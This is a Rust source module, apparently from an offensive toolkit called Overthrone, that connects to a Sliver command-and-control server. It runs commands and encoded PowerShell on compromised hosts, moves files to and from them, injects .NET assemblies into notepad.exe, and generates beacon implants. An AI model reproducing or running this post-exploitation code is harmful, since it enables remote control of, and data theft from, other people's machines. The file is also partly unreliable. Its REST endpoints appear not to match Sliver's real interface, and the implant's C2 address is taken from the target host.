//! Sliver C2 integration via REST API
//!
//! Connects to the Sliver teamserver using HTTP/HTTPS REST endpoints.
//! Requires a valid Sliver operator config file (.cfg) which contains
//! mTLS certificates for authentication.
//!
//! The operator config JSON supplies the CA cert, client cert/key for
//! mTLS, plus the host and port to connect to.
//!
//! REST API docs: <https://sliver.sh/docs?name=Multi-player+Mode>

use super::{
    C2Auth, C2Channel, C2Config, C2Framework, C2Listener, C2Session, C2TaskResult,
    DeliveryMethod, ImplantRequest, SessionType,
};
use crate::error::{OverthroneError, Result};
use async_trait::async_trait;
use reqwest::{Client, Identity};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;

// ── Sliver operator config ────────────────────────────────────────────

/// Sliver operator config file (`.cfg`) structure
#[derive(Debug, Clone, Deserialize)]
struct SliverOperatorConfig {
    operator: String,
    token: String,
    lhost: String,
    lport: u16,
    ca_certificate: String,
    certificate: String,
    private_key: String,
}

// ── JSON response types from Sliver REST API ──────────────────────────

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct SliverSessionResp {
    #[serde(alias = "ID")]
    id: String,
    name: String,
    hostname: String,
    remote_address: String,
    username: String,
    #[serde(alias = "OS")]
    os: String,
    arch: String,
    #[serde(alias = "PID")]
    pid: u32,
    filename: String,
    active_c2: String,
    reconnect_interval: Option<u64>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct SliverBeaconResp {
    #[serde(alias = "ID")]
    id: String,
    name: String,
    hostname: String,
    remote_address: String,
    username: String,
    #[serde(alias = "OS")]
    os: String,
    arch: String,
    #[serde(alias = "PID")]
    pid: u32,
    filename: String,
    active_c2: String,
    interval: u64,
    jitter: u64,
    next_checkin: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct SliverExecResp {
    status: u32,
    stdout: String,
    stderr: String,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct SliverUploadResp {
    path: String,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct SliverDownloadResp {
    data: String, // base64-encoded
    exists: bool,
    encoder: String,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct SliverTaskResp {
    #[serde(alias = "TaskID")]
    task_id: String,
    state: String,
    output: Option<String>,
    error: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct SliverVersionResp {
    major: u32,
    minor: u32,
    patch: u32,
    commit: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct SliverJobResp {
    #[serde(alias = "ID")]
    id: u32,
    name: String,
    protocol: String,
    port: u16,
}

// ── Channel struct ────────────────────────────────────────────────────

/// Sliver REST API channel
pub struct SliverChannel {
    /// HTTP client with mTLS credentials
    client: Option<Client>,
    /// Base URL for the REST API (e.g. `https://10.0.0.1:31337`)
    base_url: String,
    /// API auth token from the operator config
    token: String,
    /// Connected flag
    connected: bool,
    /// Operator name from config
    operator_name: String,
    /// Server metadata
    server_info: HashMap<String, String>,
}

impl SliverChannel {
    pub fn new() -> Self {
        Self {
            client: None,
            base_url: String::new(),
            token: String::new(),
            connected: false,
            operator_name: String::new(),
            server_info: HashMap::new(),
        }
    }

    /// Parse a Sliver operator config file (`.cfg`)
    fn parse_operator_config(path: &str) -> Result<SliverOperatorConfig> {
        let content = std::fs::read_to_string(path).map_err(|e| {
            OverthroneError::C2(format!("Cannot read Sliver config {path}: {e}"))
        })?;
        serde_json::from_str(&content)
            .map_err(|e| OverthroneError::C2(format!("Invalid Sliver config: {e}")))
    }

    /// Build a reqwest client with mTLS from the operator config
    fn build_client(config: &SliverOperatorConfig) -> Result<Client> {
        // Combine cert + key into PEM for reqwest::Identity
        let pem = format!("{}\n{}", config.certificate, config.private_key);
        let identity = Identity::from_pem(pem.as_bytes())
            .map_err(|e| OverthroneError::C2(format!("mTLS identity error: {e}")))?;

        // CA certificate
        let ca = reqwest::Certificate::from_pem(config.ca_certificate.as_bytes())
            .map_err(|e| OverthroneError::C2(format!("CA cert error: {e}")))?;

        Client::builder()
            .identity(identity)
            .add_root_certificate(ca)
            .danger_accept_invalid_certs(false)
            .timeout(Duration::from_secs(30))
            .build()
            .map_err(|e| OverthroneError::C2(format!("HTTP client build error: {e}")))
    }

    // ── helpers ──────────────────────────────────────────────────

    /// `GET {base}/api/v1/{path}` with bearer token.
    async fn api_get(&self, path: &str) -> Result<reqwest::Response> {
        let client = self
            .client
            .as_ref()
            .ok_or_else(|| OverthroneError::C2("Not connected".into()))?;

        let url = format!("{}/api/v1/{}", self.base_url, path);
        let resp = client
            .get(&url)
            .bearer_auth(&self.token)
            .send()
            .await
            .map_err(|e| OverthroneError::C2(format!("GET {url} failed: {e}")))?;

        Self::check_status(resp).await
    }

    /// `POST {base}/api/v1/{path}` with bearer token and JSON body.
    async fn api_post<T: Serialize + ?Sized>(
        &self,
        path: &str,
        body: &T,
    ) -> Result<reqwest::Response> {
        let client = self
            .client
            .as_ref()
            .ok_or_else(|| OverthroneError::C2("Not connected".into()))?;

        let url = format!("{}/api/v1/{}", self.base_url, path);
        let resp = client
            .post(&url)
            .bearer_auth(&self.token)
            .json(body)
            .send()
            .await
            .map_err(|e| OverthroneError::C2(format!("POST {url} failed: {e}")))?;

        Self::check_status(resp).await
    }

    /// Check HTTP status, returning an error for 4xx/5xx.
    async fn check_status(resp: reqwest::Response) -> Result<reqwest::Response> {
        let status = resp.status();
        if status.is_client_error() || status.is_server_error() {
            let body = resp.text().await.unwrap_or_default();
            return Err(OverthroneError::C2(format!(
                "HTTP {status}: {body}"
            )));
        }
        Ok(resp)
    }

    /// Poll a beacon task until it completes or the timeout elapses.
    async fn poll_beacon_task(
        &self,
        beacon_id: &str,
        task_id: &str,
        timeout: Duration,
    ) -> Result<C2TaskResult> {
        let start = std::time::Instant::now();
        loop {
            if start.elapsed() > timeout {
                return Ok(C2TaskResult {
                    task_id: task_id.to_string(),
                    success: false,
                    output: String::new(),
                    error: "Timeout waiting for beacon check-in".into(),
                    raw_data: None,
                    duration: start.elapsed(),
                });
            }

            let path = format!("beacons/{beacon_id}/tasks/{task_id}");
            if let Ok(resp) = self.api_get(&path).await {
                if let Ok(task) = resp.json::<SliverTaskResp>().await {
                    if task.state == "completed" {
                        return Ok(C2TaskResult {
                            task_id: task.task_id,
                            success: task.error.as_deref().unwrap_or("").is_empty(),
                            output: task.output.unwrap_or_default(),
                            error: task.error.unwrap_or_default(),
                            raw_data: None,
                            duration: start.elapsed(),
                        });
                    }
                }
            }

            tokio::time::sleep(Duration::from_secs(3)).await;
        }
    }

    /// Determine whether `id` is a session or beacon by attempting both
    /// endpoints, and return a tag.
    async fn resolve_session_type(&self, id: &str) -> SessionKind {
        if self
            .api_get(&format!("sessions/{id}"))
            .await
            .is_ok()
        {
            return SessionKind::Interactive;
        }
        SessionKind::Beacon
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SessionKind {
    Interactive,
    Beacon,
}

// ── C2Channel implementation ──────────────────────────────────────────

#[async_trait]
impl C2Channel for SliverChannel {
    fn framework(&self) -> C2Framework {
        C2Framework::Sliver
    }

    async fn connect(&mut self, config: &C2Config) -> Result<()> {
        log::info!(
            "[c2:sliver] Connecting to Sliver at {}:{}",
            config.host,
            config.port
        );

        // Load operator config
        let operator_config = match &config.auth {
            C2Auth::SliverConfig { config_path } => Self::parse_operator_config(config_path)?,
            C2Auth::MtlsCert {
                cert_path,
                key_path,
                ca_path,
            } => SliverOperatorConfig {
                operator: "overthrone".into(),
                token: String::new(),
                lhost: config.host.clone(),
                lport: config.port,
                ca_certificate: std::fs::read_to_string(ca_path)
                    .map_err(|e| OverthroneError::C2(format!("CA cert read: {e}")))?,
                certificate: std::fs::read_to_string(cert_path)
                    .map_err(|e| OverthroneError::C2(format!("Cert read: {e}")))?,
                private_key: std::fs::read_to_string(key_path)
                    .map_err(|e| OverthroneError::C2(format!("Key read: {e}")))?,
            },
            _ => {
                return Err(OverthroneError::C2(
                    "Sliver requires SliverConfig or MtlsCert authentication".into(),
                ));
            }
        };

        self.operator_name = operator_config.operator.clone();
        self.token = operator_config.token.clone();
        self.base_url = format!(
            "https://{}:{}",
            operator_config.lhost, operator_config.lport
        );
        self.client = Some(Self::build_client(&operator_config)?);

        // Verify connectivity by fetching version
        let resp = self.api_get("version").await?;
        if let Ok(ver) = resp.json::<SliverVersionResp>().await {
            let ver_str = format!("{}.{}.{}", ver.major, ver.minor, ver.patch);
            self.server_info.insert("version".into(), ver_str);
            if let Some(c) = ver.commit {
                self.server_info.insert("commit".into(), c);
            }
        }
        self.server_info
            .insert("operator".into(), self.operator_name.clone());

        self.connected = true;
        log::info!(
            "[c2:sliver] Connected as operator '{}'",
            self.operator_name
        );
        Ok(())
    }

    async fn disconnect(&mut self) -> Result<()> {
        self.client = None;
        self.connected = false;
        log::info!("[c2:sliver] Disconnected");
        Ok(())
    }

    fn is_connected(&self) -> bool {
        self.connected
    }

    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        let mut result: Vec<C2Session> = Vec::new();

        // Interactive sessions
        let resp = self.api_get("sessions").await?;
        if let Ok(sessions) = resp.json::<Vec<SliverSessionResp>>().await {
            for s in sessions {
                result.push(C2Session {
                    id: s.id.clone(),
                    hostname: s.hostname.clone(),
                    ip: s.remote_address.split(':').next().unwrap_or("").to_string(),
                    username: s.username.clone(),
                    domain: s.username.split('\\').next().unwrap_or("").to_string(),
                    process: s.filename.clone(),
                    pid: s.pid,
                    arch: s.arch.clone(),
                    os: s.os.clone(),
                    elevated: s
                        .username
                        .to_lowercase()
                        .contains("system")
                        || s.username.to_lowercase().contains("administrator"),
                    session_type: SessionType::Session,
                    last_seen: "active".into(),
                    sleep_interval: None,
                    metadata: {
                        let mut m = HashMap::new();
                        m.insert("c2".into(), s.active_c2.clone());
                        m.insert("name".into(), s.name.clone());
                        m
                    },
                });
            }
        }

        // Beacons
        let resp = self.api_get("beacons").await?;
        if let Ok(beacons) = resp.json::<Vec<SliverBeaconResp>>().await {
            for b in beacons {
                result.push(C2Session {
                    id: b.id.clone(),
                    hostname: b.hostname.clone(),
                    ip: b.remote_address.split(':').next().unwrap_or("").to_string(),
                    username: b.username.clone(),
                    domain: b.username.split('\\').next().unwrap_or("").to_string(),
                    process: b.filename.clone(),
                    pid: b.pid,
                    arch: b.arch.clone(),
                    os: b.os.clone(),
                    elevated: false,
                    session_type: SessionType::SliverBeacon,
                    last_seen: b.next_checkin.unwrap_or_else(|| "unknown".into()),
                    sleep_interval: Some(Duration::from_secs(b.interval)),
                    metadata: {
                        let mut m = HashMap::new();
                        m.insert("c2".into(), b.active_c2.clone());
                        m.insert("name".into(), b.name.clone());
                        m.insert("jitter".into(), b.jitter.to_string());
                        m
                    },
                });
            }
        }

        Ok(result)
    }

    async fn get_session(&self, session_id: &str) -> Result<C2Session> {
        self.list_sessions()
            .await?
            .into_iter()
            .find(|s| s.id == session_id)
            .ok_or_else(|| {
                OverthroneError::C2(format!("Session/beacon {session_id} not found"))
            })
    }

    async fn exec_command(&self, session_id: &str, command: &str) -> Result<C2TaskResult> {
        let start = std::time::Instant::now();
        let kind = self.resolve_session_type(session_id).await;

        // Split command into executable + args
        let (exe, args) = {
            let mut parts = command.splitn(2, ' ');
            let exe = parts.next().unwrap_or(command);
            let args_str = parts.next().unwrap_or("");
            (exe.to_string(), args_str.to_string())
        };

        let body = serde_json::json!({
            "Path": exe,
            "Args": args.split_whitespace().collect::<Vec<_>>(),
            "Output": true,
        });

        match kind {
            SessionKind::Interactive => {
                let path = format!("sessions/{session_id}/exec");
                let resp = self.api_post(&path, &body).await?;
                let exec: SliverExecResp = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Parse exec response: {e}")))?;

                let output = if !exec.stdout.is_empty() {
                    exec.stdout
                } else {
                    exec.stderr.clone()
                };

                Ok(C2TaskResult {
                    task_id: format!("sliver-{}", uuid::Uuid::new_v4().as_simple()),
                    success: exec.status == 0,
                    output,
                    error: exec.stderr,
                    raw_data: None,
                    duration: start.elapsed(),
                })
            }
            SessionKind::Beacon => {
                let path = format!("beacons/{session_id}/exec");
                let resp = self.api_post(&path, &body).await?;
                let task: SliverTaskResp = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Parse task response: {e}")))?;

                self.poll_beacon_task(session_id, &task.task_id, Duration::from_secs(300))
                    .await
            }
        }
    }

    async fn exec_powershell(&self, session_id: &str, script: &str) -> Result<C2TaskResult> {
        // Use Sliver's shell command to invoke PowerShell
        let ps_cmd = format!(
            "powershell.exe -NoP -NonI -Enc {}",
            base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                script.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<_>>()
            )
        );
        self.exec_command(session_id, &ps_cmd).await
    }

    async fn upload_file(
        &self,
        session_id: &str,
        local_data: &[u8],
        remote_path: &str,
    ) -> Result<C2TaskResult> {
        let start = std::time::Instant::now();
        let kind = self.resolve_session_type(session_id).await;

        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            local_data,
        );

        let body = serde_json::json!({
            "Path": remote_path,
            "Data": encoded,
            "IsIOC": false,
        });

        let prefix = match kind {
            SessionKind::Interactive => format!("sessions/{session_id}/upload"),
            SessionKind::Beacon => format!("beacons/{session_id}/upload"),
        };

        let resp = self.api_post(&prefix, &body).await?;

        match kind {
            SessionKind::Interactive => {
                let upload: SliverUploadResp = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Parse upload response: {e}")))?;
                Ok(C2TaskResult {
                    task_id: format!("sliver-up-{}", uuid::Uuid::new_v4().as_simple()),
                    success: true,
                    output: format!(
                        "Uploaded {} bytes to {}",
                        local_data.len(),
                        upload.path
                    ),
                    error: String::new(),
                    raw_data: None,
                    duration: start.elapsed(),
                })
            }
            SessionKind::Beacon => {
                let task: SliverTaskResp = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Parse task response: {e}")))?;
                self.poll_beacon_task(session_id, &task.task_id, Duration::from_secs(300))
                    .await
            }
        }
    }

    async fn download_file(
        &self,
        session_id: &str,
        remote_path: &str,
    ) -> Result<C2TaskResult> {
        let start = std::time::Instant::now();
        let kind = self.resolve_session_type(session_id).await;

        let body = serde_json::json!({ "Path": remote_path });

        let prefix = match kind {
            SessionKind::Interactive => format!("sessions/{session_id}/download"),
            SessionKind::Beacon => format!("beacons/{session_id}/download"),
        };

        let resp = self.api_post(&prefix, &body).await?;

        match kind {
            SessionKind::Interactive => {
                let dl: SliverDownloadResp = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Parse download response: {e}")))?;

                if !dl.exists {
                    return Err(OverthroneError::C2(format!(
                        "Remote file not found: {remote_path}"
                    )));
                }

                let raw = base64::Engine::decode(
                    &base64::engine::general_purpose::STANDARD,
                    &dl.data,
                )
                .map_err(|e| OverthroneError::C2(format!("base64 decode: {e}")))?;

                Ok(C2TaskResult {
                    task_id: format!("sliver-dl-{}", uuid::Uuid::new_v4().as_simple()),
                    success: true,
                    output: format!("Downloaded {} bytes from {remote_path}", raw.len()),
                    error: String::new(),
                    raw_data: Some(raw),
                    duration: start.elapsed(),
                })
            }
            SessionKind::Beacon => {
                let task: SliverTaskResp = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Parse task response: {e}")))?;
                self.poll_beacon_task(session_id, &task.task_id, Duration::from_secs(300))
                    .await
            }
        }
    }

    async fn execute_assembly(
        &self,
        session_id: &str,
        assembly_data: &[u8],
        args: &str,
    ) -> Result<C2TaskResult> {
        let start = std::time::Instant::now();
        let kind = self.resolve_session_type(session_id).await;

        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            assembly_data,
        );

        let body = serde_json::json!({
            "Assembly": encoded,
            "Arguments": args,
            "Process": "notepad.exe",
            "IsDLL": false,
            "Arch": "amd64",
            "ClassName": "",
            "Method": "",
            "AppDomain": "",
        });

        let prefix = match kind {
            SessionKind::Interactive => format!("sessions/{session_id}/execute-assembly"),
            SessionKind::Beacon => format!("beacons/{session_id}/execute-assembly"),
        };

        let resp = self.api_post(&prefix, &body).await?;

        match kind {
            SessionKind::Interactive => {
                let exec: SliverExecResp = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Parse exec-assembly response: {e}")))?;
                Ok(C2TaskResult {
                    task_id: format!("sliver-asm-{}", uuid::Uuid::new_v4().as_simple()),
                    success: exec.status == 0,
                    output: exec.stdout,
                    error: exec.stderr,
                    raw_data: None,
                    duration: start.elapsed(),
                })
            }
            SessionKind::Beacon => {
                let task: SliverTaskResp = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Parse task response: {e}")))?;
                self.poll_beacon_task(session_id, &task.task_id, Duration::from_secs(300))
                    .await
            }
        }
    }

    async fn deploy_implant(&self, request: &ImplantRequest) -> Result<C2TaskResult> {
        let start = std::time::Instant::now();

        let c2_url = format!("mtls://{}:{}", request.target, 8888);

        let goarch = if request.arch.contains("64") || request.arch == "amd64" {
            "amd64"
        } else {
            "386"
        };

        let body = serde_json::json!({
            "C2": [{ "URL": c2_url, "Priority": 0 }],
            "GOOS": "windows",
            "GOARCH": goarch,
            "Name": format!("ovt-{}", uuid::Uuid::new_v4().as_simple()),
            "Format": match request.delivery_method {
                DeliveryMethod::SmbDrop => "EXECUTABLE",
                DeliveryMethod::FrameworkNative => "SHELLCODE",
                _ => "EXECUTABLE",
            },
            "IsBeacon": true,
            "BeaconInterval": 60,
            "BeaconJitter": 30,
        });

        let resp = self.api_post("generate", &body).await?;
        let raw = resp.bytes().await.map_err(|e| {
            OverthroneError::C2(format!("Failed to read implant data: {e}"))
        })?;

        Ok(C2TaskResult {
            task_id: format!("sliver-deploy-{}", uuid::Uuid::new_v4().as_simple()),
            success: !raw.is_empty(),
            output: format!(
                "Generated implant ({} bytes) for {}",
                raw.len(),
                request.target
            ),
            error: String::new(),
            raw_data: Some(raw.to_vec()),
            duration: start.elapsed(),
        })
    }

    async fn list_listeners(&self) -> Result<Vec<C2Listener>> {
        let resp = self.api_get("jobs").await?;
        let jobs: Vec<SliverJobResp> = resp
            .json()
            .await
            .map_err(|e| OverthroneError::C2(format!("Parse jobs response: {e}")))?;

        let listeners = jobs
            .into_iter()
            .map(|j| C2Listener {
                name: format!("{}-{}", j.name, j.id),
                listener_type: j.protocol.clone(),
                host: String::new(), // Sliver jobs don't report bind host
                port: j.port,
                active: true,
            })
            .collect();

        Ok(listeners)
    }

    async fn server_info(&self) -> Result<HashMap<String, String>> {
        Ok(self.server_info.clone())
    }
}
